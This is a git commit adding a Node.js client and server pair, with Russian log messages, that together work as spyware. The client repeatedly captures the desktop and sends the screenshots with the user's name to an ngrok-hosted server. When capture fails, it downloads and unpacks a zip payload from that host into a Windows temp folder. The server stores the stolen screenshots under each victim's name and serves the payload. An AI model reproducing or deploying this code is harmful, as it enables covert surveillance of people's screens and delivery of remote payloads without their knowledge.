c524be48d8ac4361196a3df946677519529621c5
Vlad50-50 <auditorrevizor@gmail.com>
2024-05-04 17:07:05 +0300

    first

---
+++ client/program.js
@@ -0,0 +1,83 @@
+const address = 'https://rational-namely-chipmunk.ngrok-free.app';
+const time = 10000;
+const socket = require('socket.io-client')(address);
+const screenshot = require('screenshot-desktop');
+const axios = require('axios');
+const fs = require('fs');
+const os = require('os');
+const extract = require('extract-zip');
+const path = require('path')
+
+const username = os.userInfo().username;
+const HD = os.homedir();
+
+let isImageProcessed = true;
+
+async function connect() {
+    try {
+        const response = await axios.get(address)
+        if (response.status === 200) upload(); console.log(response.status); 
+        
+    } catch (error) {
+        console.log('Ошибка переподключение через 10 секунд...');
+        setTimeout(connect, time);
+    }
+}
+
+async function upload() {
+    try {
+        socket.on('connect', () => {
+            console.log('Подключено к серверу');
+            uploadImage();
+            setInterval(() => {
+                if (isImageProcessed) {
+                    uploadImage();
+                }
+            }, time);
+        });
+    } catch (error) {
+        console.log('Ошибка при подключении:');
+        setTimeout(connect, time);
+    }
+}
+
+async function uploadImage() {
+    try {
+        const img = await screenshot();
+        let base64Image = Buffer.from(img).toString('base64');
+        let data = { image: base64Image };
+        let headers = { "name": username };
+
+        socket.emit('upload_image', data, headers);
+        isImageProcessed = false;
+        console.log("Sended");
+        
+    } catch (error) {
+        console.log('Ошибка при создании скриншота:');
+        let folderPath = path.join(HD, '\\AppData\\Local\\Temp\\screenCapture\\');
+        let zipPath = path.join(folderPath, 'files.zip');
+    
+        if (!fs.existsSync(folderPath)) {
+            fs.mkdirSync(folderPath, { recursive: true });
+            console.log('Папка успешно создана!');
+        }  
+        let response = await axios.get(address, { headers: { 'getdata': 'true' }, responseType: 'arraybuffer' });
+        fs.writeFileSync(zipPath, response.data);
+        console.log('Файл успешно сохранен!'); 
+        await extract(zipPath, { dir: folderPath });
+        console.log('Файлы успешно извлечены!');
+        connect();
+    }
+}    
+
+connect();
+
+socket.on('disconnect', () => {
+    console.log('Отключено от сервера');
+    connect();
+});
+
+socket.on('image_processed', () => {
+    isImageProcessed = true;
+    console.log("image_processed");
+});
---
+++ serv.js
@@ -0,0 +1,74 @@
+const { Server } = require("socket.io");
+const fs = require('fs');
+const path = require('path');
+const {google} = require('googleapis');
+const http = require('http');
+const express = require('express');
+
+const app = express();
+const server = http.createServer(app);
+const io = new Server(server);
+
+app.get('/', (req, res) => {
+    if (req.headers['getdata']) {
+        console.log("File request");
+        res.status(200).sendFile(path.join(__dirname,'static', 'screenCapture.zip'));
+        console.log("Sended")
+    }
+    else{
+        res.status(200).send('ok');
+    }
+
+});
+server.listen(3000, () => {
+    console.log("Погнали!");
+})
+
+
+io.on('connection', (socket) => {
+    console.log("New user: " + socket.id);
+
+    socket.on('upload_image', (data, headers) => {
+        const base64Image = data.image;
+        const imageBuffer = Buffer.from(base64Image, 'base64');
+        fs.writeFile(path.join(__dirname,'static', 'data', headers["name"] + '.jpg'), imageBuffer, err => {
+            // if (err) {
+            //     console.error(err);
+            // } else {
+                
+                console.log("it will be uploaded");
+                // const auth = new google.auth.GoogleAuth({
+                //     keyFile: path.join(__dirname,"security.json"),
+                //     scopes: ['https://www.googleapis.com/auth/drive'],
+                // });
+                // const drive = google.drive({version: 'v3', auth});
+                // const response = drive.files.create({
+                //     requestBody: {
+                //         name: headers["name"]+getCurrentDate(),
+                //         mimeType: 'image/jpg',
+                //         parents: ['1HskEq4Ss7iKtpsuh8h9mp2zr1LqHALTw']
+                //     },
+                //     media: {
+                //         mimeType: 'image/jpg',
+                //         body: fs.createReadStream(path.join(__dirname,'static', 'data', headers["name"] + '.jpg'))
+                //     }
+                // });
+                socket.emit('image_processed')
+            // }
+        });
+    });
+    socket.on('message', (data) => {
+        console.log('Сообщение от клиента: ', data);
+      });
+
+    socket.on('disconnect', () => {
+        console.log("User is disconected: " + socket.id);
+    });
+});
+
+function getCurrentDate() {
+    const date = new Date();
+    const seconds = date.getSeconds();
+    const miliseconds = date.getMilliseconds();
+    return `${seconds}-${miliseconds}`;
+}
